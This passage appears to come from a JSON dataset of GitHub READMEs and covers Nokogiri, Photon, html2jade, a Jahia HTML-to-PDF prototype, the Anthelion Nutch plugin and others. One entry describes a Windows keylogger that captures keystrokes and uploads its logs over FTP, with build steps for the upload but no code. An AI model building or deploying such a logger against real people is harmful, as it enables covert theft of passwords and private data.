usually\nfind him on the Internet in a number of different places:\n\n*   [Website](http:\/\/www.etianen.com\/ \"Dave Hall's homepage\")\n*   [Blog](http:\/\/www.etianen.com\/blog\/developers\/ \"Dave Hall's blog\")\n*   [Twitter](http:\/\/twitter.com\/etianen \"Dave Hall on Twitter\")\n*   [Google Profile](http:\/\/www.google.com\/profiles\/david.etianen \"Dave Hall's Google profile\")\n\n\nExtra credits\n-------------\n\nThe html5media project bundles together a number of excellent open-source and\ncreative-commons projects. They are listed below.\n\n*   [Flowplayer - Flash Video Player for the Web](http:\/\/flowplayer.org\/ \"Flowplayer - Flash Video Player for the Web\")\n*   [Domready - The smallest subset possible from jQuery to support DOM ready event](http:\/\/code.google.com\/p\/domready\/ \"Domready - The smallest subset possible from jQuery to support DOM ready event\")\n*   [Sintel - the Durian Open Movie Project](http:\/\/www.sintel.org\/ \"Sintel - the Durian Open Movie Project\")\n"},{"repo":"\/sparklemotion\/nokogiri","language":"Java","readme_contents":"# Nokogiri\n\n## Description\n\nNokogiri (\u92f8) is an HTML, XML, SAX, and Reader parser.  Among\nNokogiri's many features is the ability to search documents via XPath\nor CSS3 selectors.\n\n\n## Links\n\n* https:\/\/nokogiri.org\n* [Installation Help](https:\/\/nokogiri.org\/tutorials\/installing_nokogiri.html)\n* [Tutorials](https:\/\/nokogiri.org)\n* [Cheat Sheet](https:\/\/github.com\/sparklemotion\/nokogiri\/wiki\/Cheat-sheet)\n* [GitHub](https:\/\/github.com\/sparklemotion\/nokogiri)\n* [Mailing List](https:\/\/groups.google.com\/group\/nokogiri-talk)\n* [Chat\/Gitter](https:\/\/gitter.im\/sparklemotion\/nokogiri)\n\n\n## Status\n\n[![Concourse CI](https:\/\/ci.nokogiri.org\/api\/v1\/teams\/nokogiri-core\/pipelines\/nokogiri\/jobs\/ruby-2.4-system\/badge)](https:\/\/ci.nokogiri.org\/teams\/nokogiri-core\/pipelines\/nokogiri)\n[![Appveyor CI](https:\/\/ci.appveyor.com\/api\/projects\/status\/xj2pqwvlxwuwgr06\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/flavorjones\/nokogiri\/branch\/master)\n[![Code Climate](https:\/\/codeclimate.com\/github\/sparklemotion\/nokogiri.svg)](https:\/\/codeclimate.com\/github\/sparklemotion\/nokogiri)\n[![Test Coverage](https:\/\/api.codeclimate.com\/v1\/badges\/59c67b0e8976027a45ad\/test_coverage)](https:\/\/codeclimate.com\/github\/sparklemotion\/nokogiri\/test_coverage)\n\n[![Gem Version](https:\/\/badge.fury.io\/rb\/nokogiri.svg)](https:\/\/rubygems.org\/gems\/nokogiri)\n[![SemVer compatibility](https:\/\/api.dependabot.com\/badges\/compatibility_score?dependency-name=nokogiri&package-manager=bundler&version-scheme=semver)](https:\/\/dependabot.com\/compatibility-score.html?dependency-name=nokogiri&package-manager=bundler&version-scheme=semver)\n[![Tidelift dependencies](https:\/\/tidelift.com\/badges\/github\/sparklemotion\/nokogiri)](https:\/\/tidelift.com\/subscription\/pkg\/rubygems-nokogiri?utm_source=rubygems-nokogiri&utm_medium=referral&utm_campaign=readme)\n\n\n## Features\n\n* XML\/HTML DOM parser which handles broken HTML\n* XML\/HTML SAX parser\n* XML\/HTML Push parser\n* XPath 1.0 support for document searching\n* CSS3 selector support for document searching\n* XML\/HTML builder\n* XSLT transformer\n\nNokogiri parses and searches XML\/HTML using native libraries (either C\nor Java, depending on your Ruby), which means it's fast and\nstandards-compliant.\n\n\n## Installation\n\nIf this doesn't work:\n\n```\ngem install nokogiri\n```\n\nthen please start troubleshooting here:\n\n> https:\/\/nokogiri.org\/tutorials\/installing_nokogiri.html\n\nThere are currently 1,237 Stack Overflow questions about Nokogiri\ninstallation. The vast majority of them are out of date and therefore\nincorrect. __Please do not use Stack Overflow.__\n\nInstead, [tell us](https:\/\/nokogiri.org\/tutorials\/getting_help.html)\nwhen the above instructions don't work for you. This allows us to both\nhelp you directly and improve the documentation.\n\n\n### Binary packages\n\nBinary packages are available for some distributions.\n\n* Debian: https:\/\/packages.debian.org\/sid\/ruby-nokogiri\n* SuSE: https:\/\/download.opensuse.org\/repositories\/devel:\/languages:\/ruby:\/extensions\/\n* Fedora: http:\/\/s390.koji.fedoraproject.org\/koji\/packageinfo?packageID=6756\n\n\n## Support\n\nAll official documentation is posted at https:\/\/nokogiri.org (the source for which is at https:\/\/github.com\/sparklemotion\/nokogiri.org\/, and we welcome contributions).\n\n* The Nokogiri mailing list is active: https:\/\/groups.google.com\/group\/nokogiri-talk\n* The Nokogiri bug tracker is here: https:\/\/github.com\/sparklemotion\/nokogiri\/issues\n* Before filing a bug report, please read our submission guidelines: http:\/\/nokogiri.org\/tutorials\/getting_help.html\n* The IRC channel is `#nokogiri` on freenode.\n* The project's GitHub wiki has an excellent community-maintained [Cheat Sheet](https:\/\/github.com\/sparklemotion\/nokogiri\/wiki\/Cheat-sheet) which might be useful.\n\nConsider subscribing to [Tidelift][tidelift] which provides license assurances and timely security notifications for your open source dependencies, including Nokogiri. [Tidelift][tidelift] subscriptions also help the Nokogiri maintainers fund our [automated testing](https:\/\/ci.nokogiri.org) which in turn allows us to ship releases, bugfixes, and security updates more often.\n\n  [tidelift]: https:\/\/tidelift.com\/subscription\/pkg\/rubygems-nokogiri?utm_source=rubygems-nokogiri&utm_medium=referral&utm_campaign=readme\n\n\n## Security and Vulnerability Reporting\n\nPlease report vulnerabilities at https:\/\/hackerone.com\/nokogiri\n\nFull information and description of our security policy is in [`SECURITY.md`](SECURITY.md)\n\n\n## Synopsis\n\nNokogiri is a large library, but here is example usage for parsing and examining a document:\n\n```ruby\n#! \/usr\/bin\/env ruby\n\nrequire 'nokogiri'\nrequire 'open-uri'\n\n# Fetch and parse HTML document\ndoc = Nokogiri::HTML(open('https:\/\/nokogiri.org\/tutorials\/installing_nokogiri.html'))\n\nputs \"### Search for nodes by css\"\ndoc.css('nav ul.menu li a', 'article h2').each do |link|\n  puts link.content\nend\n\nputs \"### Search for nodes by xpath\"\ndoc.xpath('\/\/nav\/\/ul\/\/li\/a', '\/\/article\/\/h2').each do |link|\n  puts link.content\nend\n\nputs \"### Or mix and match.\"\ndoc.search('nav ul.menu li a', '\/\/article\/\/h2').each do |link|\n  puts link.content\nend\n```\n\n\n## Requirements\n\n* Ruby 2.3.0 or higher, including any development packages necessary\n  to compile native extensions.\n\n* In Nokogiri 1.6.0 and later libxml2 and libxslt are bundled with the\n  gem, but if you want to use the system versions:\n\n  * First, check out [the long list](http:\/\/www.xmlsoft.org\/news.html)\n    of fixes and changes between releases before deciding to use any\n    version older than is bundled with Nokogiri.\n\n  * At install time, set the environment variable\n    `NOKOGIRI_USE_SYSTEM_LIBRARIES` or else use the\n    `--use-system-libraries` argument. (See\n    https:\/\/nokogiri.org\/tutorials\/installing_nokogiri.html#install-with-system-libraries\n    for specifics.)\n\n  * libxml2 >=2.6.21 with iconv support\n    (libxml2-dev\/-devel is also required)\n\n  * libxslt, built with and supported by the given libxml2\n    (libxslt-dev\/-devel is also required)\n\n\n## Encoding\n\nStrings are always stored as UTF-8 internally.  Methods that return\ntext values will always return UTF-8 encoded strings.  Methods that\nreturn a string containing markup (like `to_xml`, `to_html` and\n`inner_html`) will return a string encoded like the source document.\n\n__WARNING__\n\nSome documents declare one encoding, but actually use a different\none. In these cases, which encoding should the parser choose?\n\nData is just a stream of bytes. Humans add meaning to that stream. Any\nparticular set of bytes could be valid characters in multiple\nencodings, so detecting encoding with 100% accuracy is not\npossible. `libxml2` does its best, but it can't be right all the time.\n\nIf you want Nokogiri to handle the document encoding properly, your\nbest bet is to explicitly set the encoding.  Here is an example of\nexplicitly setting the encoding to EUC-JP on the parser:\n\n```ruby\n  doc = Nokogiri.XML('<foo><bar \/><\/foo>', nil, 'EUC-JP')\n```\n\n\n## Development\n\n```bash\n  bundle install\n  bundle exec rake compile test\n```\n\n\n## Code of Conduct\n\nWe've adopted the Contributor Covenant code of conduct, which you can read in full in [`CODE_OF_CONDUCT.md`](CODE_OF_CONDUCT.md).\n\n\n## License\n\nThis project is licensed under the terms of the MIT license.\n\nSee this license at [`LICENSE.md`](LICENSE.md).\n"},{"repo":"\/connors\/photon","language":"CSS","readme_contents":"# [Photon](http:\/\/photonkit.com\/)\n\n[![Build Status](https:\/\/img.shields.io\/travis\/connors\/photon\/master.svg)](https:\/\/travis-ci.org\/connors\/photon)\n\nUI toolkit for building desktop apps with Electron.\n\n## Getting started\n\n* Clone the repo with `git clone https:\/\/github.com\/connors\/photon.git`\n* [Read the docs](http:\/\/photonkit.com) to learn about the components and how to get your new application started\n\nTake note that our master branch is our active, unstable development branch and that if you're looking to download a stable copy of the repo, check the [tagged downloads](https:\/\/github.com\/connors\/photon\/tags).\n\n### What's included\n\nWithin the download you'll find the following directories and files, logically grouping common assets. You'll see something like this:\n\n```\nphoton\/\n\u251c\u2500\u2500 css\/\n\u2502   \u251c\u2500\u2500 photon.css\n\u251c\u2500\u2500 fonts\/\n\u2502   \u251c\u2500\u2500 photon-entypo.eot\n\u2502   \u251c\u2500\u2500 photon-entypo.svg\n\u2502   \u251c\u2500\u2500 photon-entypo.ttf\n\u2502   \u2514\u2500\u2500 photon-entypo.woff\n\u2514\u2500\u2500 template-app\/\n    \u251c\u2500\u2500 js\/\n    \u2502   \u2514\u2500\u2500 menu.js\n    \u251c\u2500\u2500 app.js\n    \u251c\u2500\u2500 index.html\n    \u2514\u2500\u2500 package.json\n```\n\nWe provide compiled CSS (`photon.*`). We also include the Entypo fonts and a template Electron application for you to quickly get started.\n\n## Documentation\n\nPhoton's documentation is built with [Jekyll](http:\/\/jekyllrb.com) and publicly hosted on GitHub Pages at <http:\/\/photonkit.com>. The docs may also be run locally.\n\n### Running documentation locally\n\n1. If necessary, [install Jekyll](http:\/\/jekyllrb.com\/docs\/installation) (requires v2.5.x).\n  * **Windows users:** Read [this unofficial guide](http:\/\/jekyll-windows.juthilo.com\/) to get Jekyll up and running without problems.\n2. Install the Ruby-based syntax highlighter, [Rouge](https:\/\/github.com\/jneen\/rouge), with `gem install rouge`.\n3. From the root `\/photon` directory, run `jekyll serve` in the command line.\n4. Open <http:\/\/localhost:4000> in your browser, and boom!\n\nLearn more about using Jekyll by reading its [documentation](http:\/\/jekyllrb.com\/docs\/home\/).\n\n## Contributing\n\nPlease file a GitHub issue to [report a bug](https:\/\/github.com\/connors\/photon\/issues). When reporting a bug, be sure to follow the [contributor guidelines](https:\/\/github.com\/connors\/photon\/blob\/master\/CONTRIBUTING.md).\n\n\n## Development\n\n1. Install node dependencies: `npm install`.\n2. Open the example app: `npm start`.\n\nModifying source Sass files? Open a second Terminal tab and run `npm run build` to kick off a build of the compiled `photon.css`.\n\n## Versioning\n\nFor transparency into our release cycle and in striving to maintain backward compatibility, Photon is maintained under the Semantic Versioning guidelines. Sometimes we screw up, but we'll adhere to these rules whenever possible.\n\nReleases will be numbered with the following format:\n\n`<major>.<minor>.<patch>`\n\nAnd constructed with the following guidelines:\n\n* Breaking backward compatibility **bumps the major** while resetting minor and patch\n* New additions without breaking backward compatibility **bumps the minor** while resetting the patch\n* Bug fixes and misc changes **bumps only the patch**\n\nFor more information on SemVer, please visit <http:\/\/semver.org\/>.\n\n## Maintainers\n\nConnor Sears\n\n* <https:\/\/twitter.com\/connors>\n* <https:\/\/github.com\/connors>\n\n## License\n\nCopyright @connors. Released under MIT.\n"},{"repo":"\/stefanhaustein\/htmlview","language":"Java","readme_contents":"htmlview\n========\n\n**Note**: Please use [nativehtml](https:\/\/github.com\/stefanhaustein\/nativehtml) instead!\n\n\nThis project is a port of the Google \"MiniJoe\" CLDC \/ MIDP HTML renderer to Android.\n\nIf you need more HTML formatting than TextView, but a WebView is too much or too heavy (e.g. on a watch or wearable device), this might be useful for your project: HtmlView supports many HTML 4 features and a rich CSS 2.1 subset.\n\nThe HtmlViewDemo project illustrates how to use the HtmlView component.\n\n\n\n"},{"repo":"\/validator\/htmlparser","language":"Java","readme_contents":"An HTML5 parser.\n\nPlease see http:\/\/about.validator.nu\/htmlparser\/\n\n-- Henri Sivonen (hsivonen@iki.fi).\n"},{"repo":"\/sweetsoftware\/FTPKeyLogger","language":"C++","readme_contents":"OpenKeyLogger\n=============\n\nSimple keylogger for Windows with HTML output and FTP upload.\n\n##Installation\n###Standalone (local storage)\nOpenKeyLogger should compile on any Windows machine without additional configuration. Just make sure to comment out the `#define USE_FTP` line in _keylogger.h_.\n###With SFML (FTP storage)\nOpenKeyLogger uses the Simple and Fast Multimedia Library (SFML) to upload logs to a FTP server. To enable this feature, make sure to: \n\n1. define USE_FTP in keylogger.h\n2. link to these libraries \n    3. ws2_32.lib\n\t4. sfml-main.lib\n\t5. sfml-system-s.lib\n\t6. sfml-network-s.lib\n\nFor instructions on how to compile SFML, see http:\/\/sfml-dev.org\/tutorials\/2.0\/compile-with-cmake.php\n"},{"repo":"\/donpark\/html2jade","language":"HTML","readme_contents":"# html2jade #\n[![Build Status](https:\/\/travis-ci.org\/donpark\/html2jade.png?branch=master)](https:\/\/travis-ci.org\/donpark\/html2jade)\n\n`html2jade` converts HTML into [Jade](https:\/\/github.com\/visionmedia\/jade) format.\n\nThis module is now maintained by [@aichholzer](https:\/\/github.com\/aichholzer)\n\n\n## Status ##\n\nMostly usable but sometimes requires fixing up, usually involving conditionals and scripts indentation.\n\nWhile converting a fairly complicated theme package with ~20 HTML files, I had to hand-edit just twice.\n\nCompatible with Node.js 4.0+ (verified with v4.2.4) but likely **NOT** with Node.js 0.11.x, 0.12.x, and io.js.\n\n\n## Requirements\n\n`html2jade` version prior to 0.7 support OS X and Linux only.\n\n`html2jade` version 0.7+ should support OS X, Windows, and Linux.\n\n## Install ##\n\n    npm install -g html2jade\n\n## Command-line Usage ##\n\nOutputs to stdout if input is URL\n\n    html2jade http:\/\/twitter.com\n\n    html2jade http:\/\/twitter.com > twitter.jade\n\nOutputs to file if input is file\n\n    html2jade mywebpage.html # outputs mywebpage.jade\n    html2jade public\/*.html  # converts all .html files to .jade\n\nConvert HTML from `stdin`\n\n    cat mywebpage.html | html2jade -\n\nTo generate [Scalate](http:\/\/scalate.fusesource.org\/) compatible output:\n\n    html2jade --scalate http:\/\/twitter.com\n    html2jade --scalate http:\/\/twitter.com > twitter.jade\n    html2jade --scalate mywebpage.html\n    html2jade --scalate public\/*.html\n\n### Command-line Options ###\n\n* `-d, --double` - use double quotes for attributes\n* `-o, --outdir <dir>` - path to output generated jade file(s) to\n* `-n, --nspaces <n>` - the number of spaces to indent generated files with. Default is 2 spaces\n* `-t, --tabs` - use tabs instead of spaces\n* `--donotencode` - do not html encode characters. This is useful for template files which may contain expressions like {{username}}\n* `--bodyless` - do not output enveloping html and body tags\n* `--numeric` - use numeric character entities\n* `-s, --scalate` - generate [Scalate](http:\/\/scalate.fusesource.org\/) variant of jade syntax\n* `--noattrcomma` - omit attribute separating commas\n* `--noemptypipe` - omit lines with only pipe ('|') printable character\n\n## Programmatic Usage (>= 0.0.7)\n\nTo convert raw HTML into Jade:\n\n    var html2jade = require('html2jade');\n    var html = \"<html><body>Hello World<\/body><\/html>\";\n    html2jade.convertHtml(html, {}, function (err, jade) {\n      \/\/ do your thing\n    });\n\nTo convert DOM document into Jade (client-side):\n\n    \/\/ assumes html2jade.js file has been loaded\n    Html2Jade.convertDocument(document, {}, function (err, jade) {\n      \/\/ do your thing\n    });\n    \n## Converting Mustache\/Handlebars Templates\n\nJade is commonly used to generate HTML with embedded Mustache or Handlebars templates.\n\nBe sure to use version 0.8+ if you use template expressions in element IDs or CSS class names\nto avoid generating invalid Jade files.\n\n## Tools using `html2jade` ##\n\n### Web version ###\n\nThere is a [web version](http:\/\/html2jade.aaron-powell.com\/) of `html2jade`,\nkindly provided by [@aaronpowell](https:\/\/github.com\/aaronpowell).\n\nPascal Garber's [jade2html2jade](https:\/\/github.com\/JumpLink\/jade2html2jade) does roundtrip from jade to HTML and back. [Online demo](http:\/\/jumplink.github.io\/jade2html2jade\/).\n\n### Linux tray app ###\n\n[Miniclip](http:\/\/myguidingstar.github.com\/miniclip\/) is a Linux tray app that quickly converts\nHTML to Jade, CSS to Stylus and JS to Coffee from clipboard.\n\n## Testing ##\n\nAs of version 0.4, there is a simple unit test that converts HTML files in `test\/data` directory\nand compare them against Jade files in the same directory. Unit test harness requires `coffee-script`\nand `mocha` to be installed globally. Run the tests with command `npm test`.\n\n\n## Useful forks ##\n\nIf you're having issues with `br` line-breaks which apparently Jade has some problems with,\ntry [@smaudet](https:\/\/github.com\/smaudet)'s\n[`fix-breaklines`](https:\/\/github.com\/smaudet\/html2jade\/tree\/fix-breaklines) branch.\n"},{"repo":"\/red42\/HTML5_Genetic_Cars","language":"JavaScript","readme_contents":"HTML5 Genetic Cars\n==================\n\nA genetic algorithm car evolver in HTML5 canvas.\n\nThis is inspired by BoxCar2D, and uses the same physics engine, Box2D, but it's written from scratch.\n\nThis is the code as published on http:\/\/rednuht.org\/genetic_cars_2\/\n\nThe current module-based format required npm and browserify.\n\nBuild with:\n\nnpm run-script build\n"},{"repo":"\/Jahia\/html2pdf","language":"Java","readme_contents":"# HTML to PDF Converter\n\n## Overview\n\n### Introduction\nThis module is a **Prototype** with which the Jahia Academy team is testing if [Apache PDFBox](https:\/\/pdfbox.apache.org\/) can be used to convert the Academy HTML pages into PDF documents.\n\n### Background\nOne of the features of the Jahia Academy is to allow the *download* of an HTML page. Downloading the document means actually downloading a PDF version of the HTML document.\n\nWe were looking for a dynamic solution, a solution that generates a PDF document in the \"Jahia Looks\" and that works on every Academy document.\n\n### Academy Solution\nThe requirements are to convert the HTML document into a PDF, store it as a child node and distribute to the user. On every download check if a previously generated PDF exists and if yes if it's newer than the last page modification. So either simply download the PDF or create\/re-create it dynamically.\n\n## PDF Converter\nFor the prototype we were looking for an **Open Source** converter with a license suitable for Jahia.\n\n### Apache PDFBox\n[Apache PDFBox](https:\/\/pdfbox.apache.org\/) is, based on *Open Source* and *licensing* requirements an ideal candidate. However, there are limitations that might make PDFBox challenging to be used.\n\n## The HTML 2 PDF Protoype\n\n### Parsing and Converting\n\nThe prototype starts with parsing the HTML paragraphs using the [jsoup](http:\/\/jsoup.org\/) Java HTML parser. Then the prototype iterates through the DOM and identifies tags and converts the content accordingly.\n\n### Hardcoded Conversion\nIn the first trials the conversion from e.g. a P-tag to the correct font, font-size, etc. was hardcoded.<br\/>\nCurrently the title page, header and footer are still hardcoded.\n\n### Configuration Option\nIn another update we included the option to configure styles and map these styles to HTML tags.<br\/>\nFor example:<br\/>\nStyles --> normal-text: font=Lato, font-size=10pt, etc.<br\/>\nMapping --> P = normal-text\nThe configuration still needs to be improved\n\n### Multi-Page Option\nAnother requirement was to test the possibility of chaining multiple HTML pages to one document. This feature has been added as well and it's possible to configure additional HTML links to the main page.\n\n### Component\nA component has been created to test the HTML 2 PDF converter. The component will display a \"PDF Download\" icon and clicking on it will trigger the conversion process.\n\n### The HTML 2 PDF Conversion Process\n1. Click the PDF download icon\n2. Code checks if the PDF document has been created previously\n3. If yes, compare the \"last publication\" date with the PDF creation date.\n4. If the PDF creation date is older than the *last publication* date OR there is no previously created PDF available, then create the PDF and store it as a child node of the page.\n\n## Next Steps\nThis is a **Prototype**! It works for the Jahia Academy, but will need to be cleaned-up and brought into a state it can be shared by others\n\n### Step 1 - Clean Up Java Code\nThe Java code is in working mode, but it's not following design patterns or other API standards. E.g. tags are identified and adapted in the same class. The code will need to be broken down into additional classes.\n\n### Step 2 - Make Area starting point configurable\nThis prototype is adapted to Jahia Academy HTML pages. These pages have an area called \"Document\" and hence iterates through the paragraphs within the area. <br\/>\nThe code has to be adapted to start in any given \"Area\", by adding a *default configuration* within Site settings and an *override* option within the component.\n\n### Step 3 - Make Title Page configurable\nCurrently the first page of a PDF is hard coded. In the current Jahia layout the title page consists of a background image and centralized positioning of document title and subtitle.<br\/>\nWe should build the possibility of configuring the title page.\n\n### Step 4 - Extend Styles Configuration\nThe configuration of styles and mapping of styles to HTML tags is very user friendly. However, it's limited to some simple styling, like font, font-size, etc.<br\/>\nWe should extend the style configuration with things like *background-image*, *lines (top\/bottom)* and additional elements required \n\n\n"},{"repo":"\/YahooArchive\/anthelion","language":"Java","readme_contents":"# nutch-anth\nAnthelion is a Nutch plugin for focused crawling of semantic data.\nThe project is an open-source project released under the Apache License 2.0.\n\nNote: This project contains the complete Nutch 1.6 distribution. The plugin itself can be found in \/src\/plugin\/parse-anth\n\nTable of Contents\n-----------------\n* [Nutch-Anthelion Plugin](#nutch-anthelion plugin)\n  * [Plugin Overview] (#plugin-overview)\n  * [Usage and Development] (#usage-and-development)\n  * [Some Results] (#some-results)\n  * [3rd Party Libraries] (#3rd-party-libraries)\n* [Anthelion](#anthelion) \n* [References](#references)\n\nNutch-Anthelion Plugin\n---------\nThe plugin uses an online learning approach to predict data-rich web pages based on the context of the page as well as using feedback from the extraction of metadata from previously seen pages [1].\n\n### Plugin Overview\n\nTo perform the focused crawling the plugin implements three extensions:\n\n1. **AnthelionScoringFilter** (implements the ScoringFilter interface): wraps around the Anthelion online classifier to classify newly discovered outlinks, as relevant or not. This extension gives score to each outlink, which is then used in the Generate stage, i.e., the URLs for the next fetch cycle are selected based on the score. This extension also pushes feedback to the classifier for the already parsed web pages. The online classifier can be configured and tuned (see [Usage and Development](#usage and development)).\n\n2. **WdcParser** (implements the Parser interface): This extension parses the web page content and tries to extract semantic data. The parser is adaptation of an already existing Nutch parser plugin implemented in [2]. The parser is based on the [any23 library](https:\/\/any23.apache.org\/) and is able to extract Microdata, Microformats and RDFa annotation from HTML. The extracted triples are stored in the *Content* field.\n\n3. **TripleExtractor** (implements the IndexingFilter interface): This extension stores new fields to the index that can be later used for querying.\n\nAn overview of the complete crawling process using the Anthelion plugin is given in the following figure.\n\n<p align=\"center\">\n  <img src=\"https:\/\/github.com\/yahoo\/anthelion\/blob\/master\/documentation\/architecture.png?raw=true\" alt=\"Anthelion Architecture\"\/>\n<\/p>\n\n\n### Usage and Development\n\nAs mentioned in the beginning of the document this project contains the complete Nutch 1.6 code, including the plugin. If you download the complete project, there is no need for any changes and settings. If you want to download only the plugin, please download only the nutch-anth.zip from the root of the folder and go to step 2 of the configuration. If you want to contribute to the plugin and\/or want to use the sources with another version of Nutch, please follow the following instructions:\n\n1. Download and copy the \/src\/plugin\/parse-anth folder into your Nutch's plugins directory.\n\n2. Enable the plugin in conf\/nutch-site.xml by adding *parse-anth* in the *plugin.includes* property.\n\n3. Copy the properties from nutch-anth.xml to conf\/nutch-site.xml.\n\n\t3.1. Download the baseline.properties file and set the property *anth.scoring.classifier.PropsFilePath* conf\/nutch-site.xml to point to the file. This file contains all configurations for the online classifier.\n\n4. In order for ant to compile and deploy the plugin you need to edit the src\/plugin\/build.xml, by adding the following line in the *deploy* target:\n\t```xml\n\t<ant dir=\"parse-anth\" target=\"deploy\"\/>\n\t```\n5. Add the following lines in conf\/parse-plugins.xml:\n\t```xml\n\t<mimeType name=\"text\/html\">\n\t\t\t<plugin id=\"parse-anth\" \/>\n\t\t<\/mimeType>\n\t\n\t        <mimeType name=\"application\/xhtml+xml\">\n\t\t\t<plugin id=\"parse-anth\" \/>\n\t\t<\/mimeType>\n\t```\n6. Add the following line in the *alias* property in conf\/parse-plugins.xml:\n\t\n\t```xml\n\t<alias name=\"parse-anth\" extension-id=\"com.yahoo.research.parsing.WdcParser\" \/>\n\t```\n7. Copy the *lib* folder into the root of the Nutch distribution.\n\n8. Run `mvn package` inside the *anthelion* folder. This will create the jar \"Anthelion-1.0.0-jar-with-dependencies.jar\". Copy the jar to src\/plugin\/parse-anth\/lib.\n\n9. Add the following field in conf\/schema.xml (also add it to the Solr schema.xml, if you are using Solr):\n\t```xml\n\t<field name=\"containsSem\" type=\"text_general\" stored=\"true\" indexed=\"true\"\/>\n\t```\n10. Run ant in the root of your folder.\n\n### Some Results\n\nIn order to evaluate the focused crawler we measure the precision of the crawled pages, i.e., the ratio of the number of crawled web pages that contain semantic data and the total number of crawled web pages.\nSo far, we have evaluated using three different seeds sample, and several different configurations. An overview is given in the following table.\n\n<table border=0 cellpadding=0 cellspacing=0 width=532 style='border-collapse:\n collapse;table-layout:fixed;width:532pt'>\n <col width=65 style='width:65pt'>\n <col width=77 style='mso-width-source:userset;mso-width-alt:3285;width:77pt'>\n <col width=65 span=2 style='mso-width-source:userset;mso-width-alt:2773;\n width:65pt'>\n <col class=xl65535 width=65 style='mso-width-source:userset;mso-width-alt:\n 2773;width:65pt'>\n <col width=65 span=2 style='mso-width-source:userset;mso-width-alt:2773;\n width:65pt'>\n <col class=xl65535 width=65 style='mso-width-source:userset;mso-width-alt:\n 2773;width:65pt'>\n <tr height=15 style='height:15.0pt'>\n  <td rowspan=2 height=30 class=xl65 width=65 style='height:30.0pt;width:65pt'>#seeds<\/td>\n  <td rowspan=2 class=xl68 width=77 style='width:77pt'>nutch options<\/td>\n  <td colspan=3 class=xl65 width=195 style='border-left:none;width:195pt'>standard\n  scoring<\/td>\n  <td colspan=3 class=xl65 width=195 style='border-left:none;width:195pt'>anthelion\n  scoring<\/td>\n <\/tr>\n <tr height=15 style='height:15.0pt'>\n  <td height=15 class=xl66 style='height:15.0pt;border-top:none;border-left:\n  none'>#total pages<\/td>\n  <td class=xl66 style='border-top:none;border-left:none'>#sem pages<\/td>\n  <td class=xl67 style='border-top:none;border-left:none'>precision<\/td>\n  <td class=xl66 style='border-top:none;border-left:none'>#total pages<\/td>\n  <td class=xl66 style='border-top:none;border-left:none'>#sem pages<\/td>\n  <td class=xl67 style='border-top:none;border-left:none'>precision<\/td>\n <\/tr>\n <tr height=15 style='height:15.0pt'>\n  <td height=15 class=xl66 align=right style='height:15.0pt;border-top:none'>2<\/td>\n  <td class=xl69 style='border-top:none;border-left:none'>-depth 3 -topN 1<span\n  style='display:none'>5<\/span><\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>17<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>2<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.12<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>22<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>7<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.32<\/td>\n <\/tr>\n <tr height=15 style='height:15.0pt'>\n  <td height=15 class=xl66 align=right style='height:15.0pt;border-top:none'>10<\/td>\n  <td class=xl69 style='border-top:none;border-left:none'>-depth 8 -topN 1<span\n  style='display:none'>5<\/span><\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>99<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>2<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.02<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>49<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>11<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.22<\/td>\n <\/tr>\n <tr height=15 style='height:15.0pt'>\n  <td height=15 class=xl66 align=right style='height:15.0pt;border-top:none'>1000<\/td>\n  <td class=xl69 style='border-top:none;border-left:none'>-depth 4 -topN 1<span\n  style='display:none'>000<\/span><\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>3200<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>212<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.07<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>2910<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>1469<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.50<\/td>\n <\/tr>\n <tr height=15 style='height:15.0pt'>\n  <td height=15 class=xl66 align=right style='height:15.0pt;border-top:none'>1000<\/td>\n  <td class=xl70 style='border-top:none;border-left:none'>\n  <meta charset=utf-8>\n  <span>-depth 5 -topN 2<span style='display:none'>000<\/span><\/span><\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>8240<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>511<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.06<\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>\n  <meta charset=utf-8>\n  <span>9781<\/span><\/td>\n  <td class=xl66 align=right style='border-top:none;border-left:none'>7587<\/td>\n  <td class=xl67 align=right style='border-top:none;border-left:none'>0.78<\/td>\n <\/tr>\n<\/table>\n\nThe pairwise comparison is given in the following chart:\n<p align=\"center\">\n  <img src=\"https:\/\/github.com\/yahoo\/anthelion\/blob\/master\/documentation\/results_chart.png?raw=true\" alt=\"Architecture\"\/>\n<\/p>\n\n### 3rd Party Libraries\nThe Anthelion plugin uses several 3rd party open source libraries and tools.\nHere we summarize the tools used, their purpose, and the licenses under which they're released.\n\n1. This project includes the sources of Apache Nutch 1.6 (Apache License 2.0 - http:\/\/www.apache.org\/licenses\/LICENSE-2.0)\n\t* http:\/\/nutch.apache.org\/\n\n2. Apache Any23 1.2 (Apache License 2.0 - http:\/\/www.apache.org\/licenses\/LICENSE-2.0)\n\t* Used for extraction of semantic annotation from HTML.\n\t* https:\/\/any23.apache.org\/\n\t* More information about the 3rd party dependencies used in the any23 library can be found [here](https:\/\/any23.apache.org\/)  \n\n3. The classes com.yahoo.research.parsing.WdcParser and com.yahoo.research.parsing.FilterableTripleHandler are modified versions of existing Nutch plugins (Apache License 2.0 - http:\/\/www.apache.org\/licenses\/LICENSE-2.0)\n\t* Used for parsing the crawled web pages\n\t* Hellman et al. [2]; https:\/\/www.assembla.com\/spaces\/commondata\/subversion\/source\/HEAD\/extractorNutch\n\n4. For the libraries and tools used in Anthelion, please check the Anthelion [README file] 